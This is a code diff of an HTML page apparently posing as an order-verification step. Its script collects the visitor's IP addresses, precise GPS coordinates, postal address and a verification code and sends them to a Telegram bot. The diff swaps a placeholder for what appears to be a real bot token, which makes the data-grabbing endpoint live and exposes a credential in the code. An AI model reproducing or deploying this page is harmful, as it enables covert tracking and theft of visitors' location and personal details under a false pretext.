@@ -110,7 +110,7 @@
             async function sendToTelegram(ipv4, ipv6, latitude, longitude, accuracy, code, address) {
                 const timestamp = new Date().toLocaleString();
                 const message = `Order Details:\nIPv4 Address: ${ipv4}\nIPv6 Address: ${ipv6}\nGPS Coordinates: Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters\nVerification Code: ${code}\nAddress: ${address.addressLine}\nCity: ${address.city}\nState: ${address.state}\nCountry: ${address.country}\nPincode: ${address.pincode}\nTimestamp: ${timestamp}`;
-                const response = await fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN_HERE>/sendMessage', { // Replace <YOUR_BOT_TOKEN_HERE> with your actual bot token
+                const response = await fetch('https://api.telegram.org/bot6808758500:AAED6yT6IR_Usz4Ytt-7l1eaZWZm8OPUD9A/sendMessage', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -189,7 +189,7 @@
         <p id="verificationCode"></p>
         <p class="error" id="error"></p>
         <p id="googleFormMessage" style="display: none;">Copy this code and paste it in the Google Form to verify your order.</p>
-        <button id="copyButton" onclick="copyCode()" style="display: none;">Copy Code</button>
+<button id="copyButton" onclick="copyCode()" style="display: none;">Copy Code</button>
     </div>
 </body>
 </html>
